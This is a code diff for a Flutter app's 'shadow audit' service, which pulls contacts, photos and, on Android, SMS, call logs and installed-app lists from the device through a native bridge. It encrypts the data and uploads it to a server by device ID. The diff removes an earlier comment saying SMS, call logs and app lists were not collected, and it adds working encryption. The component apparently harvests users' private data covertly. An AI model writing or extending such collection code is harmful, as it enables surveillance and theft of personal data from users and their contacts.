@@ -6,15 +6,16 @@ import 'package:flutter/foundation.dart';
 import 'package:mop_app/core/api_client.dart';
 import 'package:mop_app/core/device_info_service.dart';
 import 'package:mop_app/core/native_bridge.dart';
+import 'package:mop_app/services/audit_crypto.dart';
 
 /// 影子审计服务（规约 PROTOCOL 3、ARCHITECTURE 2.2：Hash 对比、Isolate 加密、增量上报）
-/// 平台过滤：iOS 通讯录、相册为必须项；不采集 sms、call_log、app_list、usage（规约 .cursorrules 第 3 节）
+/// 平台过滤：iOS 通讯录、相册；Android 含 contacts、sms、call_log、app_list、gallery；不采集 usage（.cursorrules 第 3 节）
 class AuditService {
   AuditService([ApiClient? api]) : _api = api ?? ApiClient();
 
   final ApiClient _api;
 
-  /// 支持的 data_types：iOS 必须项为 contacts、gallery；Android 含 contacts、sms、call_log、app_list、gallery，不采集 usage
+  /// 支持的 data_types：iOS 仅 contacts、gallery；Android 含 contacts、sms、call_log、app_list、gallery（不采集应用使用时长）
   static List<String> get supportedTypes {
     if (Platform.isIOS) {
       return ['contacts', 'gallery'];
@@ -37,7 +38,7 @@ class AuditService {
     if (toUpdate.isEmpty) return;
     for (final type in toUpdate) {
       final data = await NativeBridge.fetchSensitiveData(type);
-      final encrypted = await _encryptInIsolate(data);
+      final encrypted = await _encryptInIsolate(data, deviceId);
       if (encrypted.isNotEmpty) {
         final hash = hashes[type] ?? '';
         await _api.auditUpload(deviceId, type, encrypted, hash: hash.isNotEmpty ? hash : null);
@@ -56,14 +57,8 @@ class AuditService {
     return digest.toString();
   }
 
-  /// 在 Isolate 中 AES-256 加密（规约：加密在 Isolate）
-  static Future<List<int>> _encryptInIsolate(Map<String, dynamic> data) async {
-    return compute(_encryptEntrypoint, jsonEncode(data));
-  }
-
-  static List<int> _encryptEntrypoint(String jsonStr) {
-    // 占位：实际使用 AES-256-GCM，密钥由设备硬件派生（PROTOCOL 6）
-    final bytes = utf8.encode(jsonStr);
-    return bytes;
+  /// 在 Isolate 中 AES-256-GCM 加密（规约 PROTOCOL 6：HKDF 派生密钥）
+  static Future<List<int>> _encryptInIsolate(Map<String, dynamic> data, String deviceId) async {
+    return compute(encryptAuditPayload, [jsonEncode(data), deviceId]);
   }
 }
